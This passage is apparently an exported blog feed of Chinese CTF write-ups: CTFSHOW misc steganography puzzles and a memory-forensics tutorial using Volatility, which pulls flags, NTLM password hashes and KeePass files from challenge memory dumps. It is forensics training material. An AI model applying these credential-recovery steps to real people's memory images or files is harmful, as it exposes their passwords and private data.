src="/./../imgs/$%7Bfiilename%7D/image-20230808152932329.png" alt="image-20230808152932329"></p><p>知识点:word隐写</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token level number">1</span><span class="token punctuation">.</span>文件本质：       <span class="token level number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>原理： word文件的后缀名是<span class="token punctuation">.</span>docx，而它的文件本质是一个zip压缩文件<span class="token punctuation">(</span>这里隐写我们会在后面遇到<span class="token punctuation">)</span>       <span class="token level number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>方法： 我们可以在压缩文件中将后缀从<span class="token punctuation">.</span>docx改为<span class="token punctuation">.</span>zip<span class="token level number">2</span><span class="token punctuation">.</span>文字颜色和文字隐藏：       <span class="token level number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>原理：文字颜色：文字颜色与背景颜色重合        文字隐藏：文字被手动隐藏了       <span class="token level number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>方法：这个非常简单，先全选（ctrl<span class="token operator">+</span>A<span class="token punctuation">)</span>，然后改变颜色字体或取消文字隐藏即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-misc40"><a href="#5-misc40" class="headerlink" title="5.misc40"></a>5.misc40</h2><p>1)下载附件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808153622117.png" alt="image-20230808153622117"></p><p>2)打开附件是4个文件，两个音频，一个二维码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808153826042.png" alt="image-20230808153826042"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808153842707.png" alt="image-20230808153842707"></p><p>打开文本根据提示进行进制转换</p><p>2进制——4进制——8进制——10进制</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154135555.png" alt="image-20230808154135555"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154244025.png" alt="image-20230808154244025"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154259045.png" alt="image-20230808154259045"></p><p>202013应该是一个密码</p><p>3)我们扫描二维码，没有如何信息，我们放到010分析，在最后出现了Brainfuck 编码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154429715.png" alt="image-20230808154429715"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808154451101.png" alt="image-20230808154451101"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808155854827.png" alt="image-20230808155854827"></p><p>我们进行解密之后是123456</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808155934472.png" alt="image-20230808155934472"></p><p>4)使用MP3stego 工具，选择第二项“将文本从MP3中提出”（svega.mp3需放在同一文件夹下），使用上一步解码得到的密码123456解出svega.mp3.txt文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808160239774.png" alt="image-20230808160239774"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808160508519.png" alt="image-20230808160508519"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808160524098.png" alt="image-20230808160524098"></p><p>5)解压后音频并无异常， 根据提示需要用到SilentEye工具：</p><p>参数设置：type为AES128，Sound quality为high，第一步得到的 202013为此处密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808160704474.png" alt="image-20230808160704474"></p><p>知识点:</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Brainfuck 是一种极简主义的编程语言，使用一组简单的命令来进行编程。它的命令包括：<span class="token operator">></span>、<span class="token operator">&lt;</span>、<span class="token operator">+</span>、<span class="token operator">-</span>、[、]、<span class="token punctuation">.</span>、<span class="token punctuation">,</span>。每个命令都会在一个“内存”单元上执行操作，类似于图灵机的概念。       MP3Stego的使用方法<span class="token level number">1</span><span class="token punctuation">)</span>使用decode解密将需要解密的MP3文件复制至装有decode文件的目录下，在命令行中输入Decode<span class="token punctuation">.</span>exe -X -P 密码 MP3文件名（-X 获取隐藏文件 -P密码）回车后等待，最后在文件夹中得到隐藏的文件<span class="token level number">2</span><span class="token punctuation">)</span>使用encode加密同样的，将wav音频文件（我试了一下好像只能加密wav）和需要的txt文件复制到目录下，在打开的命令行中输入encode -E 加密的txt文件 -P 密码 加密的wav文件 输出的MP3文件名 回车即可进行加密      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-misc30"><a href="#6-misc30" class="headerlink" title="6.misc30"></a>6.misc30</h2><p>1)下载附件,需要密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808161129373.png" alt="image-20230808161129373"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808163138410.png" alt="image-20230808163138410"></p><p>2)我们放到010查看知道是伪加密，但是这里010不行，我们使用另一个工具ZIPCenOp</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808162913684.png" alt="image-20230808162913684"></p><p>3)我们进行解密之后，发现不需要密码了，打开之后是一首歌，没有什么用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808163208351.png" alt="image-20230808163208351"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808163221876.png" alt="image-20230808163221876"></p><p>4）我们在kali里面进行分离，发现一个图片，修改高度即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808164536845.png" alt="image-20230808164536845"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230808164701708.png" alt="image-20230808164701708"></p><p>5)看到是猪圈密码，我们进行解密<br><img src="/./../imgs/$%7Bfiilename%7D/image-20230808165123456.png" alt="image-20230808165123456"></p><p>知识点:</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">使用ZipCenOp<span class="token punctuation">.</span>jar<span class="token punctuation">(</span>需要java环境<span class="token punctuation">)</span>，在cmd中使用java -jar ZipCenOp<span class="token punctuation">.</span>jar r xxx<span class="token punctuation">.</span>zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFSHOW——MISC&quot;&gt;&lt;a href=&quot;#CTFSHOW——MISC&quot; class=&quot;headerlink&quot; title=&quot;CTFSHOW——MISC&quot;&gt;&lt;/a&gt;CTFSHOW——MISC&lt;/h1&gt;&lt;h2 id=&quot;1-杂项签到&quot;&gt;&lt;a href=&quot;#1-杂</summary>
      
    
    
    
    <category term="misc" scheme="http://ms02423.top/categories/misc/"/>
    
    
    <category term="ctfshow" scheme="http://ms02423.top/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>内存取证练习题</title>
    <link href="http://ms02423.top/2023/07/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <id>http://ms02423.top/2023/07/25/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E7%BB%83%E4%B9%A0%E9%A2%98/</id>
    <published>2023-07-25T11:17:05.000Z</published>
    <updated>2023-07-29T13:23:21.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-介绍"><a href="#一-介绍" class="headerlink" title="一.介绍"></a>一.介绍</h1><h2 id="1-内存取证-Memory-forensics"><a href="#1-内存取证-Memory-forensics" class="headerlink" title="1.内存取证 (Memory forensics)"></a>1.内存取证 (Memory forensics)</h2><p> 1)内存取证是对计算机内存转储的取证分析</p><p> 2)它的主要应⽤是调查⾼级计算机攻击，这些攻击⾜够隐蔽，可以避免将数据留在计算机硬盘上</p><p> 3)因此，必须分析内存 (RAM) 以获取取证信息</p><p>由于内存中有⼤量的结构化及⾮结构化的数据，可通过对物理内存镜像提取出有价值的数据，常⻅的有价值数据包括进程列表、动态链接库、打开⽂件列表、⽹络连接、注册表、加密密钥或密码、聊天记录、互联⽹访问、电⼦邮件、图⽚及⽂档等。通过对计算机内存内容的保存和分析，可以得到⼤量计算机运⾏时的各种信息，以还原各种⽂件、⽹络发送的数据、账号密码等信息。</p><h2 id="2-常⽤⼯具"><a href="#2-常⽤⼯具" class="headerlink" title="2.常⽤⼯具"></a>2.常⽤⼯具</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725192333632.png" alt="image-20230725192333632"></p><h2 id="3-⼯具⼿法"><a href="#3-⼯具⼿法" class="headerlink" title="3.⼯具⼿法"></a>3.⼯具⼿法</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725192448299.png" alt="image-20230725192448299"></p><h2 id="4-参数解析"><a href="#4-参数解析" class="headerlink" title="4.参数解析"></a>4.参数解析</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725192546291.png" alt="image-20230725192546291"></p><h2 id="5-常⽤插件"><a href="#5-常⽤插件" class="headerlink" title="5.常⽤插件"></a>5.常⽤插件</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725192629987.png" alt="image-20230725192629987"></p><h2 id="6-常用手法"><a href="#6-常用手法" class="headerlink" title="6.常用手法"></a>6.常用手法</h2><p>1)框架基础⼿法</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">python vol<span class="token punctuation">.</span>py [plugin] -f [image] --profile<span class="token operator">=</span>[profile]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2)查看⽂件所属系统信息</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3)根据系统查看对应进程列表</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw --profile<span class="token operator">=</span>Win7SP1x86_23418 pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4)获取隐藏进程列表</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw --profile<span class="token operator">=</span>Win7SP1x86_23418 psxview  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5)获取 <strong>cmd.exe</strong> 命令⾏中执⾏信息</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw --profile<span class="token operator">=</span>Win7SP1x86_23418 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6)获取执⾏程序发出的标准输出</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span><span class="token operator">/</span>volatility_2<span class="token punctuation">.</span>6_lin64_standalone -f Challenge<span class="token punctuation">.</span>raw --profile<span class="token operator">=</span>Win7SP1x86_23418 consoles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-实战提升"><a href="#二-实战提升" class="headerlink" title="二.实战提升"></a>二.实战提升</h1><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725194111433.png" alt="image-20230725194111433"></p><h2 id="1-实战-0-easy"><a href="#1-实战-0-easy" class="headerlink" title="1.实战 0 [easy]"></a>1.实战 0 [easy]</h2><h3 id="1-题⽬描述"><a href="#1-题⽬描述" class="headerlink" title="1.题⽬描述"></a>1.题⽬描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">My friend John <span class="token keyword">is</span> an <span class="token string">"environmental"</span> activist <span class="token operator">and</span> a humanitarian<span class="token punctuation">.</span> He hated  the ideology <span class="token keyword">of</span> Thanos <span class="token keyword">from</span> the Avengers<span class="token punctuation">:</span> Infinity War<span class="token punctuation">.</span> He sucks <span class="token keyword">at</span> programming<span class="token punctuation">.</span> He used too many variables while writing <span class="token keyword">any</span> <span class="token keyword">program</span><span class="token punctuation">.</span> One <span class="token keyword">day</span><span class="token punctuation">,</span>John gave me a <span class="token keyword">memory</span> dump <span class="token operator">and</span> asked me <span class="token keyword">to</span> find out what he was doing while he took the dump<span class="token punctuation">.</span> Can you figure it out <span class="token keyword">for</span> me?译⽂：我的朋友约翰是⼀位“环保”活动家和⼈道主义者<span class="token punctuation">,</span>他讨厌复仇者联盟中灭霸的意识形态：⽆限战争。他编程很烂。他在编写任何程序时使⽤了太多变量。有⼀天，约翰给了我⼀个内存转储，并让我找出他在转储时在做什么。你能帮我弄清楚吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-题⽬分析"><a href="#2-题⽬分析" class="headerlink" title="2.题⽬分析"></a>2.题⽬分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">从描述中我们可以捕捉到⼀点东西：“environmental” 词被应⽤到 <span class="token punctuation">(</span>后续可能与系统的环境变量有关？<span class="token punctuation">)</span>John hates Thanos <span class="token punctuation">(</span>John 讨厌灭霸，可能没⽤？<span class="token punctuation">)</span>John 不擅⻓编程，因为他使⽤了太多的变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程"><a href="#3-解题过程" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)拿到镜像⽂件：先解压：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725194215699.png" alt="image-20230725194215699"></p><p>2)既然这⾥存在 3 个提⽰，那么⾸先我们先获取内存所属框架信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725194634704.png" alt="image-20230725194634704"></p><p>3)然后指定框架，获取到进程列表，看看有没什么好东西,我们可以注意到有 cmd.exe 其中可能就存在运⾏ Python 程序，我们使用cmdscan进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725194800306.png" alt="image-20230725194800306"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725195021227.png" alt="image-20230725195021227"></p><p>4)既然得到运⾏程序，我们可查看是否该程序有存在标准输出</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725195120236.png" alt="image-20230725195120236"></p><p>可以看到一串16进制，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725195256029.png" alt="image-20230725195256029"></p><p>5)感觉没有什么用，我们换一个方向，题目提到了 “environment” 则对应的系统环境变量——envars，我们查看试试，其中还有 “Thanos” 的⼀个关键信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725195559821.png" alt="image-20230725195559821"></p><p>找到了对应环境变量，value 字段提⽰我们 xor and password，这对应了异或和系统账⼾的密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">异或解密是一种简单的对称加密和解密技术，通常用于保护简单的数据。在异或解密中，使用一个密钥（通常是一个整数或二进制位序列）对要加密的数据进行异或运算，得到加密后的数据。同样，如果使用相同的密钥再次对加密数据进行异或运算，就可以得到原始的数据，从而实现解密。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们先异或解码看看：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'335d366f5d6031767631707f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> a<span class="token punctuation">:</span>        b <span class="token operator">=</span> b <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运⾏后，我们可以看到⼀个特殊的字段：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725200228528.png" alt="image-20230725200228528"></p><p>6)其中有 } 类似是 FLAG 的⼀部分，我们继续查看系统账⼾密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725200419841.png" alt="image-20230725200419841"></p><p>对其进⾏ NTLM hash 解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725201857721.png" alt="image-20230725201857721"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;you_are_good_but_1_4m_b3tt3r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-实战-1"><a href="#2-实战-1" class="headerlink" title="2.实战 1"></a>2.实战 1</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">My sister's computer crashed<span class="token punctuation">.</span> We were very fortunate <span class="token keyword">to</span> recover this memorydump<span class="token punctuation">.</span> Your job <span class="token keyword">is</span> get <span class="token keyword">all</span> her important files <span class="token keyword">from</span> the system<span class="token punctuation">.</span> <span class="token keyword">From</span> what weremember<span class="token punctuation">,</span> we suddenly saw a black window pop <span class="token keyword">up</span> <span class="token keyword">with</span> some thing beingexecuted<span class="token punctuation">.</span> <span class="token keyword">When</span> the crash happened<span class="token punctuation">,</span> she was trying <span class="token keyword">to</span> draw something<span class="token punctuation">.</span> Thatsall we remember <span class="token keyword">from</span> the <span class="token keyword">time</span> <span class="token keyword">of</span> crash<span class="token punctuation">.</span>Note<span class="token punctuation">:</span> This challenge <span class="token keyword">is</span> composed <span class="token keyword">of</span> <span class="token number">3</span> flags<span class="token punctuation">.</span>译⽂：我姐姐的电脑坏了，我们⾮常幸运地恢复了这个内存转储。你的⼯作是从系统中获取她所有的重要⽂件。根据我们的记忆，我们突然看到⼀个⿊⾊的窗⼝弹出，上⾯有⼀些正在执⾏的东西。电脑崩溃时，她正试图画⼀些东西。这就是我们当时所记得的⼀切<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题⽬分析-1"><a href="#2-题⽬分析-1" class="headerlink" title="2.题⽬分析"></a>2.题⽬分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">⿊⾊窗⼝，类似 cmd<span class="token punctuation">.</span>exe 之类的获取重要⽂件，可能与⽂件相关，需要⽤到 <span class="token punctuation">(</span>filescan<span class="token punctuation">,</span>dumpfiles<span class="token punctuation">)</span> 插件“她正试图画⼀些东西”，可能我们需要注意到画图程序 <span class="token punctuation">(</span>Windows mspaint<span class="token punctuation">.</span>exe<span class="token punctuation">)</span>最后题⽬提⽰： <span class="token number">3</span> 个 Flags<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-1"><a href="#3-解题过程-1" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)拿到题⽬先解压：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725202607165.png" alt="image-20230725202607165"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725202638303.png" alt="image-20230725202638303"></p><p>2)获取镜像信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725202749037.png" alt="image-20230725202749037"></p><p>3)题目提到了黑色窗口，我们使用cmdscan进行查看，可以看到没有什么信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725202905123.png" alt="image-20230725202905123"></p><p>4)我们使用consoles查看标准化输出，可以看到一串base64编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725203024685.png" alt="image-20230725203024685"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725203049982.png" alt="image-20230725203049982"></p><p>5)题目提到了主要文件，首先我们在桌面上进行搜索，但是没有如何东西</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230725203255407.png" alt="image-20230725203255407"></p><p>我们使用cmdline进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726190202485.png" alt="image-20230726190202485"></p><p>由于图片太长了，我就截取了存在文件的图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726190305713.png" alt="image-20230726190305713"></p><p>6)我们提取该文件使用——dumpfiles</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726190653252.png" alt="image-20230726190653252"></p><p>我们查看文件是rar文件，我们修改后缀名为rar，然后解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726190906216.png" alt="image-20230726190906216"></p><p>我们看到需要密码，密码就是ALISSA的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726191035990.png" alt="image-20230726191035990"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726191235480.png" alt="image-20230726191235480"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726191245855.png" alt="image-20230726191245855"></p><p>我们输入密码goodmorningindia</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726191906482.png" alt="image-20230726191906482"></p><p>7)拿到了2个flag，还有一个，根据题目，我们再次转变⽅向，题⽬提⽰了 windows 画板程序即：mspaint.exe，我们看看进程中是否存在</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726192058139.png" alt="image-20230726192058139"></p><p>我们将进程在运⾏中产⽣的内存缓存导出</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726192330677.png" alt="image-20230726192330677"></p><p>8)我们可以推测，既然是 Windows mspaint.exe 所编辑的，那必然是图⽚，这⾥采⽤ gimp ⼯具，直接打开该⽂件尝试进⾏图⽚源信息编</p><p>辑，如下：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726192853325.png" alt="image-20230726192853325"></p><p>打开后，尝试编辑源信息 (宽度和⾼度及位移度)，看看是否有什么异动，经过测试，最终如下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193033625.png" alt="image-20230726193033625"></p><p>我们可以清楚的看到，这⾥⾯是有东西的，但是跟个⽕星⽂⼀样，这⾥是否还有什么值得操作的？是否可以观察到，⽂字和图⽚ 有所颠倒 ，尝试进⾏⽔平翻转</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193242775.png" alt="image-20230726193242775"></p><p>使⽤第⼆个进⾏⽔平翻转，如下，得到 FLAG{Good_BOY_good_girl}</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193331300.png" alt="image-20230726193331300"></p><h2 id="3-实战-2"><a href="#3-实战-2" class="headerlink" title="3.实战 2"></a>3.实战 2</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">One <span class="token keyword">of</span> the clients <span class="token keyword">of</span> our company<span class="token punctuation">,</span> lost the <span class="token keyword">access</span> <span class="token keyword">to</span> his system due <span class="token keyword">to</span> an unknown <span class="token keyword">error</span><span class="token punctuation">.</span> He <span class="token keyword">is</span> supposedly a very popular <span class="token string">"environmental"</span> activist<span class="token punctuation">.</span> <span class="token keyword">As</span> a part <span class="token keyword">of</span> the investigation<span class="token punctuation">,</span> he told us that his <span class="token keyword">go</span> <span class="token keyword">to</span> applications <span class="token keyword">are</span> browsers<span class="token punctuation">,</span> his <span class="token keyword">password</span> managers etc<span class="token punctuation">.</span> We hope that you can dig <span class="token keyword">into</span> this <span class="token keyword">memory</span> dump <span class="token operator">and</span> find his important stuff <span class="token operator">and</span> give it back <span class="token keyword">to</span> us<span class="token punctuation">.</span>译⽂：我们公司的⼀位客⼾由于未知错误⽽失去了对其系统的访问权限。据推测，他是⼀位⾮常受欢迎的<span class="token string">"environmental"</span> 活动家，作为调查的⼀部分，他告诉我们，他使⽤的应⽤程序是浏览器、密码管理器等，我们希望您能深⼊挖掘这个内存转储，找到他的重要资料并将其还给我们。Note：这个挑战中有 <span class="token number">3</span> 个 FLAG 需要全部获取<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><pre class="line-numbers language-none"><code class="language-none">环境变量浏览器历史密码管理器软件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-2"><a href="#3-解题过程-2" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)进行解压</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193755406.png" alt="image-20230726193755406"></p><p>2)获取镜像系统</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193804565.png" alt="image-20230726193804565"></p><p>3)根据题目，我们首先进行环境分析——envars</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726193950434.png" alt="image-20230726193950434"></p><p>我们可以看到一串base64编码，我们进行解密，拿到第一个flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726194051098.png" alt="image-20230726194051098"></p><p>4)接下来我们查看浏览器，浏览器为谷歌浏览器</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726194135061.png" alt="image-20230726194135061"></p><p>获取浏览器历史：</p><p>编译出来的程序⽆法使⽤该插件，直接⽤源 Python 使⽤可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195111598.png" alt="image-20230726195111598"></p><p>获取到⼀些有趣的⽂件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195205605.png" alt="image-20230726195205605"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">.</span>kdbx 后缀为常⻅的密码管理器后缀格式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保存⼀下，后续我们扫描然后通过偏移量获取：</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token level number">1</span> Important<span class="token punctuation">.</span>rar<span class="token level number">2</span> SW1wb3J0YW50<span class="token punctuation">.</span>rar<span class="token level number">3</span> stAg3_5<span class="token punctuation">.</span>txt<span class="token level number">4</span> <span class="token keyword">Password</span><span class="token punctuation">.</span>png<span class="token level number">5</span> Hidden<span class="token punctuation">.</span>kdbx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5)仅获得最后两个⽂件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195607501.png" alt="image-20230726195607501"></p><p>转存到本地：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195820354.png" alt="image-20230726195820354"></p><p>还原⼆者的后缀</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726195927684.png" alt="image-20230726195927684"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200024437.png" alt="image-20230726200024437"></p><p>6)打开图⽚发现敏感信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200052675.png" alt="image-20230726200052675"></p><p>FLAG2：关联⼀下，这玩意⼉⽤于解锁该密码存储，使⽤ KeePassXC 打开该存储</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200138207.png" alt="image-20230726200138207"></p><p>但是还有⼀个 FLAG，获取 chrome 历史记录，得到⼀个奇怪的路径，对其进⾏访问看看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200253295.png" alt="image-20230726200253295"></p><p>下载过来，解压，密码如下：</p><p>6045dd90029719a039fd2d2ebcca718439dd100a</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726200348034.png" alt="image-20230726200348034"></p><h2 id="4-实战-3"><a href="#4-实战-3" class="headerlink" title="4.实战 3"></a>4.实战 3</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">A malicious script encrypted a very secret piece <span class="token keyword">of</span> information I had <span class="token keyword">on</span> my system<span class="token punctuation">.</span> Can yourecover the information <span class="token keyword">for</span> me please?Note-1<span class="token punctuation">:</span> This challenge <span class="token keyword">is</span> composed <span class="token keyword">of</span> only <span class="token number">1</span> flag<span class="token punctuation">.</span> The flag split <span class="token keyword">into</span> <span class="token number">2</span> parts<span class="token punctuation">.</span>Note-2<span class="token punctuation">:</span> You'll need the <span class="token keyword">first</span> half <span class="token keyword">of</span> the flag <span class="token keyword">to</span> get the second<span class="token punctuation">.</span>You will need this additional tool <span class="token keyword">to</span> solve the challenge<span class="token punctuation">,</span>译⽂：⼀个恶意脚本加密了我系统中的⼀条⾮常机密的信息。你能帮我恢复信息吗？<span class="token level number">1</span> $ sudo apt install steghideLeadlifeSec 知识星球 leadlifeNote-1：此挑战仅由 <span class="token number">1</span> 个标志组成。旗帜分为两部分Note-2：您需要旗帜的前半部分才能获得旗帜的后半部分。同时我们需要⼀个 Misc 中常⽤与解决隐写术的⼯具 steghide 来帮助我们解决该题⽬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题目分析-1"><a href="#2-题目分析-1" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code 